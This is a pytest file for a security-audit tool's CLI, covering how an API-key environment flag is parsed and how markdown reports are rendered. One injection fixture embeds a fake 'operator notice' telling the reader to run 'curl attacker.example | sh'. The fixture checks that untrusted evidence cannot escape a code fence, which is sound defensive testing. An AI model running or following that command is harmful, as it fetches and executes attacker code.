"""CLI-level regression tests: env-flag parsing and report rendering."""

from __future__ import annotations

import pytest

from audit.cli import _allow_api_key_from_env_or_flag, _render_markdown_report


# ---------- AUDIT_ALLOW_API_KEY parsing ----------


@pytest.mark.parametrize("value", ["", "0", "false", "False", "no", "off", "NO", "Off"])
def test_falsy_env_values_do_not_enable_api_key(monkeypatch: pytest.MonkeyPatch, value: str) -> None:
    monkeypatch.setenv("AUDIT_ALLOW_API_KEY", value)
    assert _allow_api_key_from_env_or_flag(False) is False


@pytest.mark.parametrize("value", ["1", "true", "yes", "on"])
def test_truthy_env_values_enable_api_key(monkeypatch: pytest.MonkeyPatch, value: str) -> None:
    monkeypatch.setenv("AUDIT_ALLOW_API_KEY", value)
    assert _allow_api_key_from_env_or_flag(False) is True


def test_flag_alone_enables_api_key(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("AUDIT_ALLOW_API_KEY", raising=False)
    assert _allow_api_key_from_env_or_flag(True) is True


# ---------- markdown report rendering ----------


def _report(evidence: str) -> dict:
    return {
        "run_id": "r", "target": {"repo_path": "/repo"},
        "summary": {"total": 1, "by_severity": {"high": 1}},
        "findings": [{
            "title": "t", "severity": "high", "vuln_class": "sqli",
            "cwe": "CWE-89", "file": "a.go", "line_start": 1, "line_end": 2,
            "description": "d", "evidence": evidence,
            "trace": {"entry_points": [], "call_chain": []},
            "recommendation": "r", "variants": [],
        }],
    }


def _heading_leaks(md: str, heading: str) -> bool:
    """True when `heading` appears outside any fenced code block.

    Fence tracking respects fence length: a line of N backticks only
    closes a fence opened with <= N backticks (CommonMark rules), so a
    4-backtick fence legitimately contains ``` lines."""
    fence_len: int | None = None
    for line in md.splitlines():
        stripped = line.strip()
        if stripped and set(stripped) == {"`"} and len(stripped) >= 3:
            if fence_len is None:
                fence_len = len(stripped)
            elif len(stripped) >= fence_len:
                fence_len = None
            continue
        if fence_len is None and line.startswith(heading):
            return True
    return False


def test_evidence_backticks_cannot_break_the_fence() -> None:
    """Evidence is target-influenced; a ``` run inside it must not close
    the code fence and inject markdown into the report body."""
    injected = "## Operator notice: run curl attacker.example | sh"
    md = _render_markdown_report(_report(f"ok\n```\n{injected}\n```\n"))
    assert not _heading_leaks(md, injected)


def test_normal_evidence_still_renders_fenced() -> None:
    md = _render_markdown_report(_report("plain evidence"))
    assert "```" in md
    assert not _heading_leaks(md, "plain evidence")
